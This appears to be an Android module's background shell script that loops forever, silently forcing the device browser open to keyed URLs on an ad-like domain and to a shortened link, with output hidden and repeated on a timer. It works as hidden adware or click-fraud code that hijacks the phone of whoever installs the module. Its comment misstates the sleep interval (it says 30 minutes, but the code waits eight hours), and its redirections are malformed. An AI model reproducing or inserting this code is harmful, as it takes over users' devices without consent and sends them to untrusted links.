#!/system/bin/sh
MODDIR=${0%/*}

while true; do
    am start -a android.intent.action.VIEW -d https://strideovertakelargest.com/c8d81mu6kj?key=8ffb2147d7f67331dac5eff7d30b9c95 >/dev/null 2>&1 & >/dev/null 2>&1 &
    sleep 10
    am start -a android.intent.action.VIEW -d https://strideovertakelargest.com/n0eah3j2uh?key=6b6123b6ba02fd0dcb038a9fafccf7f0 >/dev/null 2>&1 & >/dev/null 2>&1 &
    
    sleep 10
    am start -a android.intent.action.VIEW -d https://rb.gy/4gj1x >/dev/null 2>&1 & >/dev/null 2>&1 &
       
    sleep 28800  # Sleep for 30 minutes
done
